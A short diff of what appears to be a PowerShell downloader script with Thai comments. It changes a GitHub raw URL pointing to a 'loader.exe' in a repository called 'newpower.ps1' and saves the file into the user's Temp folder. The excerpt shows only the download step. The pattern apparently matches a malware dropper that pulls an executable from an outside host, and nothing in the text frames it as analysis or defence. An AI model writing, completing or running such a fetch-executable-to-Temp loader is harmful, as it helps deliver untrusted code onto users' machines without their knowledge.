@@ -1,5 +1,5 @@
 # 1. ตั้งค่าตำแหน่งดาวน์โหลด (เก็บไว้ในโฟลเดอร์ Temp ของเครื่อง)
-$exeUrl = "https://github.com/lubyralph6-maker/newpower.ps1/raw/main/loader.exe"
+$exeUrl = "https://github.com/lubyralph6-maker/newpower.ps1/raw/main/_Loader.exe"
 $outputPath = "$env:TEMP\loader.exe"
 
 # 2. เริ่มการดาวน์โหลด
